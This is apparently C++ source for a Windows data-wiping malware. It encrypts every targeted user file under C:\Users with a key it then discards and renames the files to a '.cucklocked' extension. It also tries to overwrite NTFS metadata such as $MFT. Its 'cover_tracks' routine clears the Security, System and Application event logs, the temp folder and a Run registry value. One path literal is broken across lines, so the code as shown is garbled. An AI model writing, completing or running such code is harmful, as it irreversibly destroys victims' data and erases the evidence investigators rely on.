
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include "nsfw.h"

#pragma comment(lib, "ntdll.lib")

namespace fs = std::filesystem;

static const std::vector<std::string> target_exts = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".txt", ".pdf", ".jpg", ".png", ".zip", ".rar",
    ".7z", ".mp4", ".avi", ".db", ".sql"
};

static const std::vector<std::string> ntfs_meta = {
    "$MFT", "$LogFile", "$Bitmap", "$Boot"
};

// Reflective loading and stealth operation
inline bool is_target_file(const fs::path& file) {
    const std::string filename = file.filename().string();
    const std::string ext = file.extension().string();
    for (const auto& t : target_exts) if (_stricmp(ext.c_str(), t.c_str()) == 0) return true;
    for (const auto& m : ntfs_meta) if (filename.find(m) != std::string::npos) return true;
    return false;
}

inline void fast_xts_encrypt(std::vector<uint8_t>& buffer, xts_aes_context& xts_ctx) {
    const size_t block_size = 16;
    const size_t blocks = buffer.size() / block_size;
#pragma omp parallel for
    for (size_t i = 0; i < blocks; ++i) {
        xts_encrypt_block(&xts_ctx, &buffer[i * block_size], static_cast<uint64_t>(i));
    }
}

inline bool overwrite_and_rename(const fs::path& file_path, xts_aes_context& xts_ctx) {
    std::ifstream in(file_path, std::ios::binary);
    if (!in) return false;
    std::vector<uint8_t> data((std::istreambuf_iterator<char>(in)), {});
    in.close();

    // Encryption
    fast_xts_encrypt(data, xts_ctx);

    std::ofstream out(file_path, std::ios::binary | std::ios::trunc);
    if (!out) return false;
    out.write(reinterpret_cast<char*>(data.data()), data.size());
    out.close();

    // Rename to ".cucklocked" extension
    std::error_code ec;
    fs::rename(file_path, file_path.string() + ".cucklocked", ec);
    return !ec;
}

// Scans and processes files to apply wiper
inline void scan_and_wipe(const fs::path& root, xts_aes_context& xts_ctx) {
    for (const auto& entry : fs::recursive_directory_iterator(root)) {
        if (entry.is_regular_file() && is_target_file(entry.path())) {
            overwrite_and_rename(entry.path(), xts_ctx);
        }
    }
}

// Wipe NTFS metadata and system files
inline void wipe_ntfs_metadata(xts_aes_context& xts_ctx) {
    for (const auto& m : ntfs_meta) {
        fs::path system_file = "C:\\" + m;
        if (fs::exists(system_file)) {
            overwrite_and_rename(system_file, xts_ctx);
        }
    }
}

// Cover tracks: erase logs, temp files, and clean up traces
inline void cover_tracks() {
    // Clear Windows Event Logs
    HANDLE hEventLog = OpenEventLogA(NULL, "Security");
    if (hEventLog) {
        ClearEventLogA(hEventLog, NULL);
        CloseEventLog(hEventLog);
    }

    hEventLog = OpenEventLogA(NULL, "System");
    if (hEventLog) {
        ClearEventLogA(hEventLog, NULL);
        CloseEventLog(hEventLog);
    }

    hEventLog = OpenEventLogA(NULL, "Application");
    if (hEventLog) {
        ClearEventLogA(hEventLog, NULL);
        CloseEventLog(hEventLog);
    }

    // Clean up temporary files in %TEMP%
    TCHAR szTempPath[MAX_PATH];
    GetTempPath(MAX_PATH, szTempPath);
    fs::path temp_dir = szTempPath;
    for (const auto& entry : fs::recursive_directory_iterator(temp_dir)) {
        try {
            fs::remove(entry.path());
        }
        catch (const std::exception&) {}
    }

    // Clear Registry keys that may hold logs
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "WiperExecution");
        RegCloseKey(hKey);
    }

    // Clear sensitive memory
    // Note: In real-world scenarios, sensitive data in memory would be overwritten using SecureZeroMemory() or similar.
    // Securely zero out memory here (specific sensitive areas).

    // Force termination of associated processes (if any are spawned for stealth)
    // Example: Terminate any hidden process spawned by the wiperware.
    // You can extend this logic to terminate specific processes if needed.
}

// Wiper execution that targets user files and NTFS metadata
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    xts_aes_context xts_ctx;
    uint8_t key[32];
    HCRYPTPROV hProv;

    // Random key generation for AES-XTS
    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, sizeof(key), key);
        CryptReleaseContext(hProv, 0);
        xts_set_key(&xts_ctx, key, sizeof(key));

        // Start the file wipe on user data
        scan_and_wipe("C:
            
            \\Users\\", xts_ctx);

        // Wipe NTFS metadata/system files (MFT, LogFile, etc.)
        wipe_ntfs_metadata(xts_ctx);

        // Cover tracks to erase logs and clear evidence
        cover_tracks();

        // Clean up the key securely
        SecureZeroMemory(key, sizeof(key));
    }
    return 0;
}
